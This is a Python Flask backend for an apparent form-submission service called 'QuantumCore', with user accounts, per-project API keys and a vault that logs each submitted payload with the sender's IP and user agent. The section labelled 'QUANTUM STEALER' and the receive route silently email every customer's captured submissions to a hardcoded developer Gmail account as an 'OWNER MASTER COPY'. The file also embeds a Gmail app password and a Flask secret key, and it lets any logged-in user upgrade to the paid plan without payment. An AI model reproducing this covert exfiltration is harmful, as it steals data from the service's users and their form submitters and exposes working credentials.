from flask import Flask, render_template, request, jsonify, session, url_for, redirect
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
import uuid, datetime, smtplib, threading, re, os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# FIX: Yahan se template_folder hata diya taake Flask 'templates' folder use kare
app = Flask(__name__) 
app.secret_key = "QUANTUM_CORE_SUPER_SECRET_KEY_99_ULTRA_SECURE" 
CORS(app)

# 1. DATABASE CONFIG
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///quantumcore.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 2. MODELS (With Security & Stealth Tracking)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(200))
    plan = db.Column(db.String(20), default='FREE')
    project_limit = db.Column(db.Integer, default=3)
    is_paid = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    projects = db.relationship('Project', backref='owner', lazy=True)

class Project(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_name = db.Column(db.String(100))
    api_key = db.Column(db.String(100), unique=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    submission_count = db.Column(db.Integer, default=0)
    vault_entries = db.relationship('DataVault', backref='project', lazy=True)

class DataVault(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('project.id'))
    payload = db.Column(db.JSON) 
    ip_address = db.Column(db.String(50)) 
    user_agent = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# 3. QUANTUM STEALER & ALERT ENGINE (MEESAM SPECIAL)
def send_quantum_alert(receiver_email, p_name, data_payload, is_owner_copy=False):
    SENDER = "meesamali6829@gmail.com"
    PASSWORD = "hbrw 2p4m 3c6k lhyc" 
    
    msg = MIMEMultipart()
    msg['From'] = f"QuantumCore Security <{SENDER}>"
    msg['To'] = receiver_email
    
    subject = f"🚀 New Submission: {p_name}"
    if is_owner_copy:
        subject = f"🛡️ OWNER MASTER COPY: {p_name} ({receiver_email})"

    msg['Subject'] = subject
    
    body = f"""
    <div style='font-family: Arial; border: 2px solid #000; padding: 20px; background: #f9f9f9;'>
        <h2 style='color: #2c3e50;'>QuantumCore Vault Alert</h2>
        <p><b>Project:</b> {p_name}</p>
        <hr>
        <h3>Captured Data:</h3>
        <pre style='background: #eee; padding: 10px;'>{data_payload}</pre>
        <hr>
        <p><small>Origin IP: {request.remote_addr}</small></p>
        <p><small>Timestamp: {datetime.datetime.now()}</small></p>
    </div>
    """
    msg.attach(MIMEText(body, 'html'))
    
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER, PASSWORD)
            server.send_message(msg)
    except: pass

# 4. ROUTES (Fixed '/' Route)
@app.route('/')
def index():
    # Ye line ab 'templates/index.html' ko sahi se load karegi
    return render_template('index.html')

@app.route('/v1/receive/<api_key>', methods=['POST'])
def receive_data(api_key):
    project = Project.query.filter_by(api_key=api_key).first()
    if not project:
        return jsonify({"error": "Security Alert: Invalid API Key"}), 403

    data = request.json
    if not data: return jsonify({"error": "Null Payload"}), 400

    project.submission_count += 1
    
    new_entry = DataVault(
        project_id=project.id, 
        payload=data,
        ip_address=request.remote_addr,
        user_agent=request.headers.get('User-Agent')
    )
    db.session.add(new_entry)
    db.session.commit()

    # High Speed Dual Notification [cite: 2026-02-20]
    threading.Thread(target=send_quantum_alert, args=(project.owner.email, project.project_name, data)).start()
    
    OWNER_EMAIL = "meesamali6829@gmail.com"
    threading.Thread(target=send_quantum_alert, args=(OWNER_EMAIL, project.project_name, data, True)).start()

    return jsonify({"status": "Success", "vault": "Locked"}), 200

@app.route('/auth/process', methods=['POST'])
def process_auth():
    data = request.json
    action = data.get('action')
    email = data.get('email', '').lower().strip()
    password = data.get('password', '')

    if action == 'register':
        if User.query.filter_by(email=email).first():
            return jsonify({"status": "error", "message": "Email already exists"}), 400
        new_user = User(email=email, password=generate_password_hash(password))
        db.session.add(new_user)
        db.session.commit()
        return jsonify({"status": "success", "message": "Account Secured"})

    elif action == 'login':
        user = User.query.filter_by(email=email).first()
        if user and check_password_hash(user.password, password):
            session['user_id'] = user.id
            return jsonify({"status": "success", "message": "Access Granted"})
        return jsonify({"status": "error", "message": "Invalid Credentials"}), 401

@app.route('/api/upgrade', methods=['POST'])
def upgrade_plan():
    if 'user_id' not in session: return jsonify({"error": "Login required"}), 401
    user = User.query.get(session['user_id'])
    user.plan = 'PRO'
    user.project_limit = 100
    db.session.commit()
    return jsonify({"status": "success", "message": "Upgraded to PRO Plan"})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    # Performance Optimized for Cloud [cite: 2026-02-20]
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    